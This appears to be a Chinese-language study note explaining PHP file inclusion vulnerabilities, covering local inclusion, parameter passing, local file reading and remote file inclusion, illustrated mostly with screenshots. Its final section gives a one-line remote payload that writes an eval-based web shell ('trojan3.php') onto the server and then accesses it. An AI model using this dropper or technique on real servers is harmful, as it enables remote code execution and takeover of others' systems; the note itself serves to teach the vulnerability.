[TOC]



# ==文件包含漏洞原理==



![image-20240730152337129](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240730152337129.png)

#### **文件包含中有几个我们需要注意的点**

- 被包含的文件无论后缀名是什么，只要里面含有php代码，都会被解析并执行（就相当于拷贝了一份内容在主动包含的文件中进行执行）

- **包含本地文件时**，如果该本地文件不需要传参数，那么直接传递该参数值即可，例如![image-20240730142337772](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240730142337772.png)但如果包含的文件也是需要传递参数的，那么我们就需要注意传递参数的问题，我们不能直接在包含的文件后面跟 ? 传递参数，而是使用 & 跟进参数，否则就会报错，我们看下图![image-20240730143007920](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240730143007920.png)![image-20240730143045585](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240730143045585.png)这是因为文件包含就相当于直接把被包含的文件中的代码复制了一份拷贝在主动包含文件之中进行执行，那么此时我们传的参数就应该是传递给主动包含的文件的，否则单纯的还是用 ? 跟进参数，那么系统就会把带有 ? 的文件名和参数整个作为文件名传递给主动包含文件，这就出错了。
  - 当然我们还可以包含本地其他文件从而进行文件内容的读取![image-20240730143619195](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240730143619195.png)
  - 甚至哪怕是 txt 文件，只要文件中包含的有 php 代码，都会被以 php 的语法进行执行，其他的就以 html 展现出来![image-20240730144320798](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240730144320798.png)

- **包含远程文件时**![image-20240730145754981](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240730145754981.png)

  此时虽然可以直接在被包含的文件后面直接用 ? 跟进参数，但是这样的话，我们就相当于是把被包含的文件经过传递的参数**在远程执行之后**，把执行后的结果传递给主动包含文件，这种情况有时候就不是我们所需要的。![image-20240730150218754](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240730150218754.png)

  用linux系统包含了一份windows系统上的文件，然后**用 ? 传入参数**，得到的信息就是windows系统的参数，这也验证了上面的说法（**把被包含的文件经过传递的参数在远程执行之后，把执行后的结果传递给主动包含文件**）

  要想远程包含文件，并且在主动包含文件的主机上执行代码，单纯的使用& 跟进参数传递时没用的。![image-20240730151211516](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240730151211516.png)

  我们需要包含的远程文件不能是以 php 或代码后缀结尾的文件，因为这样，服务器一旦包含远程文件之后发现这是一份可以执行的文件类型，那么就会立马直接进行执行。所以**包含远程文件时，我们需要包含一份不具备执行功能的文件类型，例如 txt 文件，并且用 & 跟进参数传递。**我们看下面的示例![image-20240730151951593](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240730151951593.png)并且此时由于该远程文件不是可执行的文件类型，所以，就算单独给该文件用 ? 传递参数也是不能执行的![image-20240730151825279](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240730151825279.png)

- 远程包含文件写入木马
  - 远程文件中的内容如下：`<?php file_put_contents("temp/trojan3.php",'<?php @eval($_GET["a"]); ?>'); ?>` 
  - 包含远程文件之前，服务器文件如下![image-20240730153007778](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240730153007778.png)
  - 包含远程文件之后，服务器文件如下![image-20240730154152808](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240730154152808.png)
  - 访问木马![image-20240730154323061](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240730154323061.png)

